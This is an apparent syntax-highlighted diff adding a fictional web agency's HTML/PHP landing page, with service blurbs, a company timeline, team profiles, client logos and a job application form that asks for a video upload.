+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"masthead-heading text-uppercase"</span><span class="nt">&gt;</span>It's Nice To Meet You<span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-primary btn-xl text-uppercase"</span> <span class="na">href=</span><span class="s">"#services"</span><span class="nt">&gt;</span>Tell Me More<span class="nt">&lt;/a&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/header&gt;</span>
+    <span class="c">&lt;!-- Services--&gt;</span>
+    <span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"page-section"</span> <span class="na">id=</span><span class="s">"services"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"text-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"section-heading text-uppercase"</span><span class="nt">&gt;</span>Services<span class="nt">&lt;/h2&gt;</span>
+                <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"section-subheading text-muted"</span><span class="nt">&gt;</span>Professional Services<span class="nt">&lt;/h3&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row text-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"fa-stack fa-4x"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-circle fa-stack-2x text-primary"</span><span class="nt">&gt;&lt;/i&gt;</span>
+                        <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-shopping-cart fa-stack-1x fa-inverse"</span><span class="nt">&gt;&lt;/i&gt;</span>
+                    <span class="nt">&lt;/span&gt;</span>
+                    <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"my-3"</span><span class="nt">&gt;</span>E-Commerce Solutions<span class="nt">&lt;/h4&gt;</span>
+                    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>Enhance your online business with our cutting-edge e-commerce solutions. We
+                        provide a seamless shopping experience for your customers, from product selection to secure
+                        checkout.<span class="nt">&lt;/p&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"fa-stack fa-4x"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-circle fa-stack-2x text-primary"</span><span class="nt">&gt;&lt;/i&gt;</span>
+                        <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-laptop fa-stack-1x fa-inverse"</span><span class="nt">&gt;&lt;/i&gt;</span>
+                    <span class="nt">&lt;/span&gt;</span>
+                    <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"my-3"</span><span class="nt">&gt;</span>Responsive Web Design<span class="nt">&lt;/h4&gt;</span>
+                    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>Our websites are built with responsive design in mind, ensuring that your site
+                        looks and works flawlessly on any device. Reach a wider audience and improve user satisfaction
+                        with our designs.<span class="nt">&lt;/p&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"fa-stack fa-4x"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-circle fa-stack-2x text-primary"</span><span class="nt">&gt;&lt;/i&gt;</span>
+                        <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fas fa-lock fa-stack-1x fa-inverse"</span><span class="nt">&gt;&lt;/i&gt;</span>
+                    <span class="nt">&lt;/span&gt;</span>
+                    <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"my-3"</span><span class="nt">&gt;</span>Robust Web Security<span class="nt">&lt;/h4&gt;</span>
+                    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>Protect your online presence with our state-of-the-art web security solutions.
+                        We prioritize the safety of your data and user information, keeping your website and customers
+                        secure.<span class="nt">&lt;/p&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/section&gt;</span>
+    <span class="c">&lt;!-- About--&gt;</span>
+    <span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"page-section"</span> <span class="na">id=</span><span class="s">"about"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"text-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"section-heading text-uppercase"</span><span class="nt">&gt;</span>About Us<span class="nt">&lt;/h2&gt;</span>
+                <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"section-subheading text-muted"</span><span class="nt">&gt;</span>Discover our journey and milestones.<span class="nt">&lt;/h3&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"timeline"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;li&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-image"</span><span class="nt">&gt;&lt;img</span> <span class="na">class=</span><span class="s">"rounded-circle img-fluid"</span> <span class="na">src=</span><span class="s">"assets/img/about/1.jpg"</span>
+                            <span class="na">alt=</span><span class="s">"Our Humble Beginnings"</span> <span class="nt">/&gt;&lt;/div&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-panel"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-heading"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;h4&gt;</span>2017-2020<span class="nt">&lt;/h4&gt;</span>
+                            <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"subheading"</span><span class="nt">&gt;</span>Our Humble Beginnings<span class="nt">&lt;/h4&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-body"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>In the early years, our journey began with a small team of passionate
+                                individuals. We embarked on a mission to deliver innovative solutions, and our
+                                dedication soon started to bear fruit.<span class="nt">&lt;/p&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/li&gt;</span>
+                <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"timeline-inverted"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-image"</span><span class="nt">&gt;&lt;img</span> <span class="na">class=</span><span class="s">"rounded-circle img-fluid"</span> <span class="na">src=</span><span class="s">"assets/img/about/2.jpg"</span>
+                            <span class="na">alt=</span><span class="s">"An Agency is Born"</span> <span class="nt">/&gt;&lt;/div&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-panel"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-heading"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;h4&gt;</span>March 2021<span class="nt">&lt;/h4&gt;</span>
+                            <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"subheading"</span><span class="nt">&gt;</span>An Agency is Born<span class="nt">&lt;/h4&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-body"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>In March 2021, our agency officially came into existence. With a clear
+                                vision and determination, we transformed into a full-fledged agency, ready to serve our
+                                clients with excellence.<span class="nt">&lt;/p&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/li&gt;</span>
+                <span class="nt">&lt;li&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-image"</span><span class="nt">&gt;&lt;img</span> <span class="na">class=</span><span class="s">"rounded-circle img-fluid"</span> <span class="na">src=</span><span class="s">"assets/img/about/3.jpg"</span>
+                            <span class="na">alt=</span><span class="s">"Transition to Full Service"</span> <span class="nt">/&gt;&lt;/div&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-panel"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-heading"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;h4&gt;</span>December 2022<span class="nt">&lt;/h4&gt;</span>
+                            <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"subheading"</span><span class="nt">&gt;</span>Transition to Full Service<span class="nt">&lt;/h4&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-body"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>By December 2022, we had evolved into a full-service agency, offering
+                                a wide range of solutions to meet our clients' diverse needs. Our commitment to quality
+                                remained unwavering.<span class="nt">&lt;/p&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/li&gt;</span>
+                <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"timeline-inverted"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-image"</span><span class="nt">&gt;&lt;img</span> <span class="na">class=</span><span class="s">"rounded-circle img-fluid"</span> <span class="na">src=</span><span class="s">"assets/img/about/4.jpg"</span>
+                            <span class="na">alt=</span><span class="s">"Phase Two Expansion"</span> <span class="nt">/&gt;&lt;/div&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-panel"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-heading"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;h4&gt;</span>July 2023<span class="nt">&lt;/h4&gt;</span>
+                            <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"subheading"</span><span class="nt">&gt;</span>Phase Two Expansion<span class="nt">&lt;/h4&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-body"</span><span class="nt">&gt;</span>
+                            <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>In July 2023, we embarked on an exciting phase of expansion. With new
+                                opportunities on the horizon, we're dedicated to delivering even greater value to our
+                                clients and partners.<span class="nt">&lt;/p&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/li&gt;</span>
+                <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"timeline-inverted"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"timeline-image"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;h4&gt;</span>
+                            Be Part
+                            <span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+                            Of Our
+                            <span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
+                            Success Story!
+                        <span class="nt">&lt;/h4&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/li&gt;</span>
+            <span class="nt">&lt;/ul&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/section&gt;</span>
+
+    <span class="c">&lt;!-- Team--&gt;</span>
+    <span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"page-section bg-light"</span> <span class="na">id=</span><span class="s">"team"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"text-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"section-heading text-uppercase"</span><span class="nt">&gt;</span>Meet Our Dedicated Team<span class="nt">&lt;/h2&gt;</span>
+                <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"section-subheading text-muted"</span><span class="nt">&gt;</span>Get to know the talented individuals behind our success.<span class="nt">&lt;/h3&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-4"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"team-member"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"mx-auto rounded-circle"</span> <span class="na">src=</span><span class="s">"assets/img/team/1.jpg"</span> <span class="na">alt=</span><span class="s">"Parveen Anand"</span> <span class="nt">/&gt;</span>
+                        <span class="nt">&lt;h4&gt;</span>Parveen Anand<span class="nt">&lt;/h4&gt;</span>
+                        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>Lead Designer<span class="nt">&lt;/p&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"Parveen Anand Twitter Profile"</span><span class="nt">&gt;&lt;i</span>
+                                <span class="na">class=</span><span class="s">"fab fa-twitter"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"Parveen Anand Facebook Profile"</span><span class="nt">&gt;&lt;i</span>
+                                <span class="na">class=</span><span class="s">"fab fa-facebook-f"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"Parveen Anand LinkedIn Profile"</span><span class="nt">&gt;&lt;i</span>
+                                <span class="na">class=</span><span class="s">"fab fa-linkedin-in"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-4"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"team-member"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"mx-auto rounded-circle"</span> <span class="na">src=</span><span class="s">"assets/img/team/2.jpg"</span> <span class="na">alt=</span><span class="s">"Diana Petersen"</span> <span class="nt">/&gt;</span>
+                        <span class="nt">&lt;h4&gt;</span>Diana Petersen<span class="nt">&lt;/h4&gt;</span>
+                        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>Lead Marketer<span class="nt">&lt;/p&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"Diana Petersen Twitter Profile"</span><span class="nt">&gt;&lt;i</span>
+                                <span class="na">class=</span><span class="s">"fab fa-twitter"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span>
+                            <span class="na">aria-label=</span><span class="s">"Diana Petersen Facebook Profile"</span><span class="nt">&gt;&lt;i</span> <span class="na">class=</span><span class="s">"fab fa-facebook-f"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span>
+                            <span class="na">aria-label=</span><span class="s">"Diana Petersen LinkedIn Profile"</span><span class="nt">&gt;&lt;i</span> <span class="na">class=</span><span class="s">"fab fa-linkedin-in"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-4"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"team-member"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"mx-auto rounded-circle"</span> <span class="na">src=</span><span class="s">"assets/img/team/3.jpg"</span> <span class="na">alt=</span><span class="s">"Larry Parker"</span> <span class="nt">/&gt;</span>
+                        <span class="nt">&lt;h4&gt;</span>Larry Parker<span class="nt">&lt;/h4&gt;</span>
+                        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"text-muted"</span><span class="nt">&gt;</span>Lead Developer<span class="nt">&lt;/p&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"Larry Parker Twitter Profile"</span><span class="nt">&gt;&lt;i</span>
+                                <span class="na">class=</span><span class="s">"fab fa-twitter"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"Larry Parker Facebook Profile"</span><span class="nt">&gt;&lt;i</span>
+                                <span class="na">class=</span><span class="s">"fab fa-facebook-f"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"Larry Parker LinkedIn Profile"</span><span class="nt">&gt;&lt;i</span>
+                                <span class="na">class=</span><span class="s">"fab fa-linkedin-in"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-8 mx-auto text-center"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"large text-muted"</span><span class="nt">&gt;</span>Our team is passionate about creating exceptional experiences for our
+                        clients. We take pride in our work and collaborate to deliver outstanding results that make a
+                        difference.<span class="nt">&lt;/p&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/section&gt;</span>
+
+    <span class="c">&lt;!-- Clients --&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"py-5"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row align-items-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-3 col-sm-6 my-3"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#!"</span><span class="nt">&gt;&lt;img</span> <span class="na">class=</span><span class="s">"img-fluid img-brand d-block mx-auto"</span> <span class="na">src=</span><span class="s">"assets/img/logos/microsoft.svg"</span>
+                            <span class="na">alt=</span><span class="s">"Microsoft Logo"</span> <span class="na">aria-label=</span><span class="s">"Microsoft Logo"</span> <span class="nt">/&gt;&lt;/a&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-3 col-sm-6 my-3"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#!"</span><span class="nt">&gt;&lt;img</span> <span class="na">class=</span><span class="s">"img-fluid img-brand d-block mx-auto"</span> <span class="na">src=</span><span class="s">"assets/img/logos/google.svg"</span>
+                            <span class="na">alt=</span><span class="s">"Google Logo"</span> <span class="na">aria-label=</span><span class="s">"Google Logo"</span> <span class="nt">/&gt;&lt;/a&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-3 col-sm-6 my-3"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#!"</span><span class="nt">&gt;&lt;img</span> <span class="na">class=</span><span class="s">"img-fluid img-brand d-block mx-auto"</span> <span class="na">src=</span><span class="s">"assets/img/logos/facebook.svg"</span>
+                            <span class="na">alt=</span><span class="s">"Facebook Logo"</span> <span class="na">aria-label=</span><span class="s">"Facebook Logo"</span> <span class="nt">/&gt;&lt;/a&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-3 col-sm-6 my-3"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#!"</span><span class="nt">&gt;&lt;img</span> <span class="na">class=</span><span class="s">"img-fluid img-brand d-block mx-auto"</span> <span class="na">src=</span><span class="s">"assets/img/logos/ibm.svg"</span>
+                            <span class="na">alt=</span><span class="s">"IBM Logo"</span> <span class="na">aria-label=</span><span class="s">"IBM Logo"</span> <span class="nt">/&gt;&lt;/a&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+
+    <span class="c">&lt;!-- Contact --&gt;</span>
+    <span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"page-section"</span> <span class="na">id=</span><span class="s">"contact"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"text-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"section-heading text-uppercase"</span><span class="nt">&gt;</span>Join Our Team<span class="nt">&lt;/h2&gt;</span>
+                <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"section-heading text-uppercase"</span><span class="nt">&gt;</span>We're Hiring Graphics Designers!<span class="nt">&lt;/h3&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"contactForm"</span> <span class="na">data-sb-form-api-token=</span><span class="s">"API_TOKEN"</span> <span class="na">action=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"
+                PHP_SELF"</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row align-items-stretch mb-5"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-6"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
+                            <span class="c">&lt;!-- First Name input --&gt;</span>
+                            <span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"firstname"</span> <span class="na">name=</span><span class="s">"firstname"</span> <span class="na">type=</span><span class="s">"text"</span>
+                                <span class="na">placeholder=</span><span class="s">"Your First Name *"</span> <span class="na">data-sb-validations=</span><span class="s">"required"</span> <span class="nt">/&gt;</span>
+                            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"invalid-feedback"</span> <span class="na">data-sb-feedback=</span><span class="s">"firstname:required"</span><span class="nt">&gt;</span>First name is required.
+                            <span class="nt">&lt;/div&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
+                            <span class="c">&lt;!-- Last Name input --&gt;</span>
+                            <span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"lastname"</span> <span class="na">name=</span><span class="s">"lastname"</span> <span class="na">type=</span><span class="s">"text"</span>
+                                <span class="na">placeholder=</span><span class="s">"Your Last Name *"</span> <span class="na">data-sb-validations=</span><span class="s">"required"</span> <span class="nt">/&gt;</span>
+                            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"invalid-feedback"</span> <span class="na">data-sb-feedback=</span><span class="s">"lastname:required"</span><span class="nt">&gt;</span>Last name is required.
+                            <span class="nt">&lt;/div&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
+                            <span class="c">&lt;!-- Email address input --&gt;</span>
+                            <span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"email"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">type=</span><span class="s">"email"</span> <span class="na">placeholder=</span><span class="s">"Your Email *"</span>
+                                <span class="na">data-sb-validations=</span><span class="s">"required,email"</span> <span class="nt">/&gt;</span>
+                            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"invalid-feedback"</span> <span class="na">data-sb-feedback=</span><span class="s">"email:required"</span><span class="nt">&gt;</span>An email is required.<span class="nt">&lt;/div&gt;</span>
+                            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"invalid-feedback"</span> <span class="na">data-sb-feedback=</span><span class="s">"email:email"</span><span class="nt">&gt;</span>Email is not valid.<span class="nt">&lt;/div&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-6"</span><span class="nt">&gt;</span>
+                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group"</span><span class="nt">&gt;</span>
+                            <span class="c">&lt;!-- Video upload input --&gt;</span>
+                            <span class="nt">&lt;small</span> <span class="na">class=</span><span class="s">"form-text text-white"</span><span class="nt">&gt;</span>Upload a brief introduction video (compatible with
+                                Windows Media Player):<span class="nt">&lt;/small&gt;</span>
+                            <span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"fileToUpload"</span> <span class="na">name=</span><span class="s">"fileToUpload"</span> <span class="na">type=</span><span class="s">"file"</span>
+                                <span class="na">accept=</span><span class="s">"video/*"</span> <span class="na">data-sb-validations=</span><span class="s">"required"</span> <span class="nt">/&gt;</span>
+                            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"invalid-feedback"</span> <span class="na">data-sb-feedback=</span><span class="s">"fileToUpload:required"</span><span class="nt">&gt;</span>A video is required.
+                            <span class="nt">&lt;/div&gt;</span>
+                            <span class="nt">&lt;small</span> <span class="na">class=</span><span class="s">"form-text text-white"</span><span class="nt">&gt;</span>Please upload a brief introduction video about yourself
+                                and your experiences, explaining why you think you're fit for the job.<span class="nt">&lt;/small&gt;</span>
+                        <span class="nt">&lt;/div&gt;</span>
+                    <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+                <span class="c">&lt;!-- Submit Button --&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"text-center"</span><span class="nt">&gt;</span>
